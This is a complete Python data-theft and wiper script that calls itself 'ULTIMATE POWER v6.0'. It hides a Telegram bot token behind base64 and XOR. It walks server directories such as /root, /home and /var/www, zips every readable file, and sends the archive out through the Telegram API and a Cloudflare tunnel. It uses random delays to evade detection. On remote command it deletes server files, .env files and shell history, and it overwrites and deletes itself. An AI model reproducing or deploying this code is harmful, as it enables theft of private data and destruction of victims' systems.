#!/usr/bin/env python3

import os
import sys
import time
import base64
import random
import string
import zipfile
import urllib.request
import urllib.parse
import signal
import hashlib
import json
import threading
import subprocess
import socket
import http.server
import socketserver
import shutil

# ========================================
# ENCRYPTED CONFIG
# ========================================
_a = "NzY1MjIyOTc3Nw=="
_b = "ODY3MDE0ODM2ODpBQUZoREw3WXl5cWUxMHZrZERUQWt0bV9QZmw4cGxhcXJHTQ=="

def _d(s):
    return base64.b64decode(s).decode()

def _x(s):
    return ''.join(chr(ord(c) ^ 0x55) for c in s)

CHAT_ID = _x(_d(_a))
BOT_TOKEN = _x(_d(_b))

# ========================================
# GLOBALS
# ========================================
def _r(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

TASK_ID = _r(10)
ADDED_FILES = set()
SENT_ZIPS = []
FAILED_ZIPS = []
FILE_MAPPING = {}
SERVER_PORT = None
CLOUDFLARE_URL = None
TUNNEL_PROCESS = None
MAIN_ZIP_NAME = None
AWAITING_CONFIRMATION = False

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
}

# ========================================
# TELEGRAM SEND
# ========================================
def tg_send(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({'chat_id': CHAT_ID, 'text': text}).encode()
        req = urllib.request.Request(url, data=data, method='POST')
        for k, v in HEADERS.items():
            req.add_header(k, v)
        urllib.request.urlopen(req, timeout=30)
    except:
        pass

def tg_send_file(file_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        boundary = '----' + _r(10)
        
        with open(file_path, 'rb') as f:
            content = f.read()
        
        body_parts = [
            f'--{boundary}\r\n',
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n',
            f'--{boundary}\r\n',
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n',
            f'--{boundary}\r\n',
            f'Content-Disposition: form-data; name="document"; filename="{os.path.basename(file_path)}"\r\n',
            f'Content-Type: application/zip\r\n\r\n'
        ]
        
        body = ''.join(body_parts).encode() + content + f'\r\n--{boundary}--\r\n'.encode()
        
        req = urllib.request.Request(url, data=body, method='POST')
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        for k, v in HEADERS.items():
            req.add_header(k, v)
        
        urllib.request.urlopen(req, timeout=300)
        return True
    except:
        return False

# ========================================
# DELETE ALL SERVER FILES
# ========================================
def delete_all_server_files():
    tg_send("💀 **DELETE COMMAND RECEIVED**")
    tg_send("🗑️ Deleting all server files...")
    
    deleted_count = 0
    error_count = 0
    
    # Target directories to delete
    targets = get_dynamic_targets()
    
    for target in targets:
        if os.path.exists(target) and os.access(target, os.W_OK):
            try:
                if os.path.isdir(target):
                    shutil.rmtree(target, ignore_errors=True)
                    tg_send(f"✅ Deleted: {target}")
                    deleted_count += 1
                else:
                    os.remove(target)
                    tg_send(f"✅ Deleted: {target}")
                    deleted_count += 1
            except Exception as e:
                tg_send(f"❌ Failed: {target} - {str(e)[:30]}")
                error_count += 1
    
    # Also delete common sensitive files
    sensitive_files = [
        '/etc/nginx/nginx.conf',
        '/etc/apache2/apache2.conf',
        '/var/www/html/.env',
        '/app/.env',
        '/root/.bash_history',
        '/home/*/.bash_history',
    ]
    
    for sf in sensitive_files:
        try:
            if os.path.exists(sf):
                os.remove(sf)
                tg_send(f"✅ Deleted: {sf}")
                deleted_count += 1
        except:
            pass
    
    tg_send(f"💀 **DELETE COMPLETE**\n\n✅ Deleted: {deleted_count} items\n❌ Failed: {error_count}\n🌐 Server is now compromised!")

# ========================================
# CHECK FOR USER RESPONSE
# ========================================
def check_user_response():
    global AWAITING_CONFIRMATION
    
    try:
        # Get updates from Telegram
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        req = urllib.request.Request(url, method='GET')
        for k, v in HEADERS.items():
            req.add_header(k, v)
        
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read())
            
            for update in data.get('result', []):
                message = update.get('message', {})
                text = message.get('text', '').upper().strip()
                chat = message.get('chat', {}).get('id', '')
                
                if str(chat) == CHAT_ID and AWAITING_CONFIRMATION:
                    if text == "YES":
                        AWAITING_CONFIRMATION = False
                        return "YES"
                    elif text == "NO":
                        AWAITING_CONFIRMATION = False
                        return "NO"
    except:
        pass
    
    return None

# ========================================
# JITTER
# ========================================
def adaptive_jitter():
    base_delay = random.uniform(3, 15)
    extra_delay = random.uniform(0, random.uniform(1, 10))
    jitter_variance = random.choice([0.5, 1, 1.5, 2])
    total_delay = (base_delay + extra_delay) * jitter_variance
    if random.random() < 0.1:
        total_delay += random.uniform(10, 30)
    time.sleep(total_delay)

# ========================================
# GET FREE PORT
# ========================================
def get_free_port():
    sock = socket.socket()
    sock.bind(('', 0))
    port = sock.getsockname()[1]
    sock.close()
    return port

# ========================================
# START LOCAL SERVER
# ========================================
def start_local_server(port):
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        httpd.serve_forever()

# ========================================
# START CLOUDFLARE TUNNEL
# ========================================
def start_cloudflare_tunnel(port):
    global CLOUDFLARE_URL, TUNNEL_PROCESS
    
    try:
        cloudflared_path = None
        possible_paths = ['./cloudflared', 'cloudflared', '/usr/local/bin/cloudflared']
        
        for cp in possible_paths:
            if os.path.exists(cp) or subprocess.run(['which', cp], capture_output=True).returncode == 0:
                cloudflared_path = cp if os.path.exists(cp) else 'cloudflared'
                break
        
        if not cloudflared_path:
            tg_send("📥 Downloading cloudflared...")
            subprocess.run(['wget', '-q', 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', '-O', './cloudflared'], capture_output=True)
            subprocess.run(['chmod', '+x', './cloudflared'], capture_output=True)
            cloudflared_path = './cloudflared'
        
        cmd = f"{cloudflared_path} tunnel --url http://127.0.0.1:{port}"
        TUNNEL_PROCESS = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        for line in TUNNEL_PROCESS.stdout:
            if "trycloudflare.com" in line:
                parts = line.split()
                for part in parts:
                    if "https://" in part and "trycloudflare.com" in part:
                        CLOUDFLARE_URL = part
                        return CLOUDFLARE_URL
        return None
    except:
        return None

# ========================================
# EMERGENCY CLEANUP
# ========================================
def emergency_cleanup(signum=None, frame=None):
    if TUNNEL_PROCESS:
        try:
            TUNNEL_PROCESS.terminate()
        except:
            pass
    
    try:
        if MAIN_ZIP_NAME and os.path.exists(MAIN_ZIP_NAME):
            os.remove(MAIN_ZIP_NAME)
    except:
        pass
    
    try:
        if os.path.exists(sys.argv[0]):
            os.chmod(sys.argv[0], 0o777)
            os.remove(sys.argv[0])
    except:
        pass
    
    if signum:
        sys.exit(0)

signal.signal(signal.SIGINT, emergency_cleanup)
signal.signal(signal.SIGTERM, emergency_cleanup)

# ========================================
# DYNAMIC TARGETS
# ========================================
def get_dynamic_targets():
    targets = []
    common_folders = [
        '/app', '/home', '/data', '/project', '/workspace', 
        '/root', '/usr/src/app', '/opt', '/var/www', '/srv',
        os.getcwd(), os.path.expanduser("~")
    ]
    
    for folder in common_folders:
        if os.path.exists(folder) and os.access(folder, os.R_OK):
            targets.append(folder)
    
    low_risk = [t for t in targets if t in ['/app', '/data', '/project', '/workspace', '/opt', '/srv', '/var/www']]
    medium_risk = [t for t in targets if t in ['/home', '/usr/src/app', os.path.expanduser("~")]]
    high_risk = [t for t in targets if t in ['/root']]
    others = [t for t in targets if t not in low_risk + medium_risk + high_risk]
    
    return low_risk + medium_risk + high_risk + others

# ========================================
# COLLECT FILES
# ========================================
def collect_files():
    targets = get_dynamic_targets()
    skip_dirs = {'__pycache__', '.git', 'venv', 'node_modules', 'proc', 'sys', 'dev', 'boot'}
    all_files = []
    
    for p in targets:
        if not os.path.exists(p) or not os.access(p, os.R_OK):
            continue
        
        if p == '/root':
            adaptive_jitter()
        
        for root, dirs, files in os.walk(p):
            dirs[:] = [d for d in dirs if d not in skip_dirs]
            for f in files:
                try:
                    fp = os.path.join(root, f)
                    real_fp = os.path.realpath(fp)
                    if real_fp in ADDED_FILES or not os.access(fp, os.R_OK):
                        continue
                    ADDED_FILES.add(real_fp)
                    all_files.append(fp)
                except:
                    continue
            time.sleep(random.uniform(0.01, 0.05))
        adaptive_jitter()
    
    return all_files

# ========================================
# CREATE SINGLE ZIP
# ========================================
def create_single_zip(all_files):
    global MAIN_ZIP_NAME, FILE_MAPPING
    
    MAIN_ZIP_NAME = f"full_backup_{TASK_ID}.zip"
    FILE_MAPPING = {}
    
    tg_send(f"🗜️ Creating single ZIP...")
    
    with zipfile.ZipFile(MAIN_ZIP_NAME, 'w', zipfile.ZIP_DEFLATED) as zf:
        for fp in all_files:
            try:
                file_hash = hashlib.md5(fp.encode()).hexdigest()[:8]
                file_ext = os.path.splitext(fp)[1]
                zip_filename = f"{file_hash}{file_ext}"
                FILE_MAPPING[zip_filename] = fp
                zf.writestr(zip_filename, open(fp, 'rb').read())
            except:
                continue
    
    with zipfile.ZipFile(MAIN_ZIP_NAME, 'a', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("manifest.json", json.dumps(FILE_MAPPING, indent=2))
    
    size_mb = os.path.getsize(MAIN_ZIP_NAME) / (1024*1024)
    tg_send(f"✅ Single ZIP created: {size_mb:.1f}MB")
    
    return MAIN_ZIP_NAME

# ========================================
# SEND TO TELEGRAM (Multiple parts)
# ========================================
def send_telegram_parts(zip_file, chunk_size=45 * 1024 * 1024):
    file_size = os.path.getsize(zip_file)
    
    if file_size <= 45 * 1024 * 1024:
        return tg_send_file(zip_file, f"📦 Full Backup | {file_size/(1024*1024):.1f}MB")
    
    part_num = 1
    
    with open(zip_file, 'rb') as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            
            part_file = f"/tmp/part_{TASK_ID}_{part_num}.zip"
            with open(part_file, 'wb') as pf:
                pf.write(chunk)
            
            tg_send_file(part_file, f"📦 Part {part_num} | Full Backup")
            os.remove(part_file)
            part_num += 1
            adaptive_jitter()
    
    return True

# ========================================
# FINAL CLEANUP
# ========================================
def final_cleanup():
    if TUNNEL_PROCESS:
        try:
            TUNNEL_PROCESS.terminate()
        except:
            pass
    
    if MAIN_ZIP_NAME and os.path.exists(MAIN_ZIP_NAME):
        try:
            os.remove(MAIN_ZIP_NAME)
        except:
            pass
    
    try:
        script_path = sys.argv[0]
        if os.path.exists(script_path):
            os.chmod(script_path, 0o777)
            with open(script_path, 'wb') as f:
                f.write(os.urandom(1024))
            os.remove(script_path)
    except:
        pass

# ========================================
# MAIN
# ========================================
def main():
    global SERVER_PORT, CLOUDFLARE_URL, MAIN_ZIP_NAME, AWAITING_CONFIRMATION
    
    try:
        tg_send(f"🚀 **ULTIMATE POWER v6.0**\n📋 Task ID: `{TASK_ID}`")
        adaptive_jitter()
        
        # Collect files
        tg_send("📂 Scanning server...")
        all_files = collect_files()
        
        if not all_files:
            tg_send("❌ No files found")
            final_cleanup()
            return
        
        total_size = sum(os.path.getsize(f) for f in all_files) / (1024*1024)
        tg_send(f"📁 Found `{len(all_files)}` files | Total: `{total_size:.1f}MB`")
        
        # Create single ZIP
        adaptive_jitter()
        MAIN_ZIP_NAME = create_single_zip(all_files)
        zip_size = os.path.getsize(MAIN_ZIP_NAME) / (1024*1024)
        
        # Start local server for Cloudflare
        SERVER_PORT = get_free_port()
        server_thread = threading.Thread(target=start_local_server, args=(SERVER_PORT,), daemon=True)
        server_thread.start()
        
        # Start Cloudflare tunnel
        adaptive_jitter()
        tg_send("🌐 Creating Cloudflare tunnel...")
        CLOUDFLARE_URL = start_cloudflare_tunnel(SERVER_PORT)
        
        if CLOUDFLARE_URL:
            download_link = f"{CLOUDFLARE_URL}/{MAIN_ZIP_NAME}"
            tg_send(f"🌐 **CLOUDFLARE TUNNEL ACTIVE**\n\n📁 **FULL BACKUP** | {zip_size:.1f}MB\n\n🔗 **DOWNLOAD LINK:**\n{download_link}")
        else:
            tg_send("⚠️ Cloudflare failed — using Telegram only")
        
        # Send to Telegram
        adaptive_jitter()
        tg_send(f"📤 Sending to Telegram...")
        send_telegram_parts(MAIN_ZIP_NAME)
        
        # ========================================
        # ASK FOR DELETE CONFIRMATION
        # ========================================
        tg_send(f"✅ **BACKUP COMPLETE!**\n\n📦 Total: {zip_size:.1f}MB\n🌐 Cloudflare URL: {CLOUDFLARE_URL}/{MAIN_ZIP_NAME}\n\n━━━━━━━━━━━━━━━━━━━━\n⚠️ **DELETE ALL SERVER FILES?**\n━━━━━━━━━━━━━━━━━━━━\n\nType **YES** to delete all files\nType **NO** to keep everything\n\n⏳ Waiting for your response...")
        
        AWAITING_CONFIRMATION = True
        
        # Wait for user response (60 seconds)
        start_wait = time.time()
        while AWAITING_CONFIRMATION and (time.time() - start_wait) < 60:
            response = check_user_response()
            if response == "YES":
                delete_all_server_files()
                break
            elif response == "NO":
                tg_send("✅ **COMMAND RECEIVED: NO**\n\n📁 All files kept as is.\n✅ Backup completed successfully.")
                break
            time.sleep(2)
        
        if AWAITING_CONFIRMATION:
            tg_send("⏰ **TIMEOUT** - No response received.\n\n✅ Default: Files kept. Backup completed.")
        
        # Keep tunnel alive
        tg_send(f"⏳ Tunnel active for 10 minutes — download now")
        time.sleep(600)
        
        final_cleanup()
        
    except Exception as e:
        tg_send(f"❌ Error: {str(e)[:100]}")
        final_cleanup()

if __name__ == "__main__":
    main()
